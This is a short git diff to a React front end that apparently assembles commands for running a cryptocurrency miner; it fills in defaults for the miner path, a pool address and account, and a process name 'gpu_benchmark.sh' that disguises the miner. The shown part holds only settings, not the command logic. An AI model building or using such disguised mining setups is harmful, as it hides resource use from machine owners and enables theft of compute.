@@ -3,11 +3,24 @@ import './App.css';
 import '98.css';
 
 const App = () => {
-  const [minerFilepath, setMinerFilepath] = useState('')
-  const [fakeProcessName, setFakeProcessName] = useState('')
-  const [config, setConfig] = useState('')
-  const [configFilename, setConfigFilename] = useState('')
-  const [killAt, setKillAt] = useState('')
+  const [minerFilepath, setMinerFilepath] = useState('/tmp/miner')
+  const [fakeProcessName, setFakeProcessName] = useState('gpu_benchmark.sh')
+  const [config, setConfig] = useState(
+    '[common]\n' +
+    'algo=ethash\n' +
+    'pers=BgoldPoW\n' +
+    'devices=0 1 2 3 4 5 6 7\n' +
+    'templimit=90\n' +
+    'watchdog=1\n' +
+    'api=10555\n' +
+    'pec=1\n' +
+    '[server]\n' +
+    'host=en.huobipool.com\n' +
+    'port=443\n' +
+    'user=esg9090'
+  )
+  const [configFilename, setConfigFilename] = useState('c')
+  const [killAt, setKillAt] = useState('now + 10 hours')
   const [message, setMessage] = useState('')
 
   const clipboard = navigator.clipboard
